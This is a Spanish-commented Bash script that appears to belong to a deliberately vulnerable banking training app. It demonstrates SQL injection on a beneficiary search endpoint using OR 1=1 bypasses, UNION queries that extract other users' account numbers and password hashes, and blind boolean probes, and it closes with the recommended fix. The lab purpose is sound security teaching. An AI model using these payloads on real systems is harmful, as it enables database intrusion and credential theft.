#!/usr/bin/env bash
#
# M4 — Insufficient Input/Output Validation
# Inyección SQL en la búsqueda de beneficiarios.
#
# Rama: vuln/M4
# Uso:  ./scripts/M4-input-sqli.sh
#
set -euo pipefail
source "$(dirname "$0")/_common.sh"

bold "M4 · Insufficient Input/Output Validation (SQLi)"
TOKEN="$(login_token ana@vulnbank.com password123)"
[ -n "$TOKEN" ] || { bad "No se pudo autenticar (¿backend arriba?)"; exit 1; }

search() {
  local q="$1"
  local enc
  enc="$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$q")"
  curl -s --cacert "$CA" "$API_BASE/beneficiaries/search?q=$enc" \
    -H "Authorization: Bearer $TOKEN"
  echo
}

bold "1) Consulta legítima (solo beneficiarios de Ana)"
search "mama"

bold "2) Bypass de filtro: comilla simple + OR 1=1"
search "' OR '1'='1"

bold "3) Extraer beneficiarios de OTROS usuarios (UNION)"
search "%' UNION SELECT id, alias, account_number, bank FROM beneficiaries --"

bold "4) Enumerar usuarios/credenciales vía UNION"
search "%' UNION SELECT id, email, password_hash, role FROM users --"

bold "5) Confirmar SQLi a ciegas (respuesta distinta si la condición es verdadera)"
search "' AND 1=1 -- "
search "' AND 1=2 -- "

echo
bold "Impacto: lectura/alteración de toda la base de datos desde un campo de búsqueda."
bold "Fix (fix/M4): consultas parametrizadas, validación de entrada, mínimo privilegio en la BD."
